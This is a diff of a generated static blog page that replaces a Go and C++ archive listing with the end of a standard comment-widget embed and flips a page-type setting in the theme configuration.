-        			<a href="/categories/Go//" class="article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/28/Go%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81/" class="archive-article-date">
-  	<time datetime="2020-11-28T07:00:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-28</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/28/Go%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81/">Go语言实现继承与多态</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Go//" class="article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/24/go-mod%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/" class="archive-article-date">
-  	<time datetime="2020-10-24T07:44:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-24</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/24/go-mod%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/">Go go.mod包管理工具</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Go//" class="article-tag-list-link color3">Go</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/09/08/CPP%E2%80%94%E2%80%94%E7%BB%A7%E6%89%BF%E4%B8%8E%E6%B4%BE%E7%94%9F/" class="archive-article-date">
-  	<time datetime="2020-09-08T13:55:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/09/08/CPP%E2%80%94%E2%80%94%E7%BB%A7%E6%89%BF%E4%B8%8E%E6%B4%BE%E7%94%9F/">C++（二）—— 继承与派生</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">C/C++</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/C-C//" class="article-tag-list-link color1">C/C++</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
   
   
-    </div></section>
+  
   
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -729,8 +612,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
